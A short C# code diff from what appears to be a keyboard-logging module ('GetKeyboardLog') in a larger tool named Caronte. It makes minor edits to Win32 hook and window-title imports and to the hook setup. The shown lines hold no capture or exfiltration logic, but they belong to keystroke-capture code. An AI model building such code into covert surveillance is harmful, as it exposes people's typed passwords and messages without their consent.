@@ -26,7 +26,7 @@ namespace Caronte.Modules.Information.GetKeyboardLog
         [DllImport("user32.dll")]
         private static extern IntPtr GetForegroundWindow();
 
-        [DllImport("user32.dll")]
+        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
         private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
@@ -39,7 +39,7 @@ namespace Caronte.Modules.Information.GetKeyboardLog
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
-        private LowLevelKeyboardProc _proc;
+        private LowLevelKeyboardProc _proc = null!;
 
         public GetKeyboardLogQueryHandler()
         {
@@ -57,7 +57,6 @@ namespace Caronte.Modules.Information.GetKeyboardLog
             inactivityTimer.Start();
 
             Application.Run();
-
             UnhookWindowsHookEx(hookId);
 
             inactivityTimer.Stop();
